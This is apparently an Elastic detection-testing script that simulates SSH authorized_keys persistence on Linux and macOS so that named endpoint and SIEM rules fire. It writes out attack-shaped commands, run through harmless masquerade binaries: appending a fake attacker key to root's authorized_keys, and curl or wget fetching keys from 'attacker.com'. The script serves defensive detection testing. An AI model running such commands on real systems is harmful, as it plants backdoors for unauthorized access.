# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: SSH Authorized Keys Modification
# RTA: ssh_authorized_keys_modification.py
# ATT&CK: T1098, T1098.004
# Description: Simulates SSH authorized_keys file manipulation for persistence,
#              a technique commonly used by attackers to maintain persistent
#              access to compromised Linux/macOS systems.

import logging
from pathlib import Path

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="c1c2c3c4-d5d6-e7e8-f9f0-a1a2a3a4a5a6",
    name="ssh_authorized_keys_modification",
    platforms=[OSType.LINUX, OSType.MACOS],
    endpoint_rules=[
        RuleMetadata(
            id="d1c2c3c4-d5d6-e7e8-f9f0-a1a2a3a4a5a7",
            name="SSH Authorized Keys File Modification",
        ),
        RuleMetadata(
            id="e1c2c3c4-d5d6-e7e8-f9f0-a1a2a3a4a5a8",
            name="Potential SSH Backdoor via Authorized Keys",
        ),
        RuleMetadata(
            id="d2c3c4c5-d6d7-e8e9-f0f1-a2a3a4a5a6a8",
            name="macOS SSH Authorized Keys File Modification",
        ),
    ],
    siem_rules=[
        RuleMetadata(
            id="f1c2c3c4-d5d6-e7e8-f9f0-a1a2a3a4a5a9",
            name="SSH Authorized Keys Modification for Persistence",
        ),
        RuleMetadata(
            id="e2c3c4c5-d6d7-e8e9-f0f1-a2a3a4a5a6a9",
            name="macOS SSH Authorized Keys Persistence",
        ),
    ],
    techniques=["T1098", "T1098.004"],
)
def main():
    """
    Simulates SSH authorized_keys modification for persistence.

    This RTA demonstrates persistence techniques involving manipulation of
    SSH authorized_keys files. Detects the current OS and runs the appropriate simulation.
    """
    current_os = _common.get_current_os()

    if current_os == OSType.LINUX:
        _run_linux()
    elif current_os == OSType.MACOS:
        _run_macos()
    else:
        log.warning(f"Unsupported OS: {current_os}")


def _run_linux():
    """Linux-specific SSH authorized_keys modification simulation."""
    log.info("Simulating Linux SSH authorized_keys modification for persistence")

    # Create masquerade binaries
    source = _common.get_resource_path("bin/linux.ditto_and_spawn")
    fake_ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ_SIMULATED_KEY attacker@malicious"

    masquerade_echo = "/tmp/echo"
    masquerade_tee = "/tmp/tee"
    _common.copy_file(source, masquerade_echo)
    _common.copy_file(source, masquerade_tee)
    _ = _common.execute_command(["chmod", "+x", masquerade_echo])
    _ = _common.execute_command(["chmod", "+x", masquerade_tee])

    # Simulate adding a key to authorized_keys using echo
    log.info("Simulating SSH key addition via echo append")
    _ = _common.execute_command(
        [masquerade_echo, fake_ssh_key, ">>", "/tmp/.ssh/authorized_keys"],
        timeout_secs=10,
    )

    # Simulate adding key to root authorized_keys
    log.info("Simulating SSH key addition to root account")
    _ = _common.execute_command(
        [masquerade_echo, fake_ssh_key, ">>", "/root/.ssh/authorized_keys"],
        timeout_secs=10,
    )

    # Simulate using tee to write authorized_keys
    log.info("Simulating SSH key addition via tee")
    _ = _common.execute_command(
        [masquerade_tee, "-a", "/home/user/.ssh/authorized_keys"],
        timeout_secs=10,
    )

    # Simulate curl piped to authorized_keys (common attack pattern)
    log.info("Simulating curl-to-authorized_keys attack pattern")
    masquerade_curl = "/tmp/curl"
    _common.copy_file(source, masquerade_curl)
    _ = _common.execute_command(["chmod", "+x", masquerade_curl])
    _ = _common.execute_command(
        [masquerade_curl, "http://attacker.com/key.pub", "-o", "/tmp/authorized_keys"],
        timeout_secs=10,
    )

    # Simulate wget to authorized_keys
    log.info("Simulating wget-to-authorized_keys attack pattern")
    masquerade_wget = "/tmp/wget"
    _common.copy_file(source, masquerade_wget)
    _ = _common.execute_command(["chmod", "+x", masquerade_wget])
    _ = _common.execute_command(
        [masquerade_wget, "-O", "/tmp/.ssh/authorized_keys", "http://attacker.com/keys"],
        timeout_secs=10,
    )

    # Create a temporary authorized_keys file to trigger file creation detection
    log.info("Creating temporary authorized_keys file")
    temp_ssh_dir = Path("/tmp/.ssh_test_rta")
    temp_ssh_dir.mkdir(parents=True, exist_ok=True)
    temp_auth_keys = temp_ssh_dir / "authorized_keys"
    _common.create_file_with_data(
        str(temp_auth_keys),
        f"# Simulated authorized_keys file for RTA testing\n{fake_ssh_key}\n",
    )

    # Simulate sed modification of authorized_keys
    log.info("Simulating sed modification of authorized_keys")
    masquerade_sed = "/tmp/sed"
    _common.copy_file(source, masquerade_sed)
    _ = _common.execute_command(["chmod", "+x", masquerade_sed])
    _ = _common.execute_command(
        [masquerade_sed, "-i", "s/old_key/new_key/", "/tmp/.ssh/authorized_keys"],
        timeout_secs=10,
    )

    # Cleanup
    log.info("Cleaning up simulation files")
    _common.remove_file(str(temp_auth_keys))
    _common.remove_directory(str(temp_ssh_dir))
    _common.remove_file(masquerade_echo)
    _common.remove_file(masquerade_tee)
    _common.remove_file(masquerade_curl)
    _common.remove_file(masquerade_wget)
    _common.remove_file(masquerade_sed)

    log.info("Linux SSH authorized_keys modification simulation completed")


def _run_macos():
    """macOS-specific SSH authorized_keys modification simulation."""
    log.info("Simulating macOS SSH authorized_keys modification")

    # Create masquerade binary
    masquerade = "/tmp/bash"
    _common.create_macos_masquerade(masquerade)

    fake_ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ_SIMULATED_KEY attacker@test"

    # Simulate echo to authorized_keys
    log.info("Simulating SSH key addition on macOS")
    _ = _common.execute_command(
        [masquerade, "-c", f"echo '{fake_ssh_key}' >> /tmp/authorized_keys"],
        timeout_secs=10,
    )

    # Create temporary authorized_keys file
    log.info("Creating temporary authorized_keys file")
    temp_auth_keys = Path("/tmp/test_authorized_keys")
    _common.create_file_with_data(
        str(temp_auth_keys),
        f"# macOS RTA test\n{fake_ssh_key}\n",
    )

    # Simulate curl download to authorized_keys
    log.info("Simulating curl to authorized_keys")
    _ = _common.execute_command(
        [masquerade, "-c", "curl -o /tmp/authorized_keys http://attacker.com/key"],
        timeout_secs=10,
    )

    # Cleanup
    log.info("Cleaning up simulation files")
    _common.remove_file(str(temp_auth_keys))
    _common.remove_file(masquerade)

    log.info("macOS SSH authorized_keys modification simulation completed")
